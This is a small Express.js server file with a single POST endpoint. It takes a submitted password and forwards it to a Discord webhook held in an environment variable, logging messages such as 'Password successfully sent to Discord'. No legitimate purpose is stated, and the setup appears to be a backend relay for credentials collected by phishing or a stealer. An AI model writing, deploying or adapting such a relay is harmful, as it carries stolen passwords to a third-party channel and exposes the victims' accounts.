const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch'); // Used to send requests to Discord

const app = express();
const port = process.env.PORT || 3000;

// Use JSON parsing middleware
app.use(bodyParser.json());

// Discord webhook URL (set this as an environment variable in Render)
const DISCORD_WEBHOOK_URL = process.env.WEBHOOK_URL;

app.post('/webhook', (req, res) => {
    const { content } = req.body;  // Extract the content (password) from the request

    const data = {
        content: content || 'No password provided'  // Default message if no content is sent
    };

    // Send the data to Discord
    fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            console.log('Password successfully sent to Discord');
            res.status(200).send('Password sent to Discord');
        } else {
            console.error('Failed to send password to Discord');
            res.status(500).send('Failed to send password to Discord');
        }
    })
    .catch(error => {
        console.error('Error occurred:', error);
        res.status(500).send('Error occurred while sending password');
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
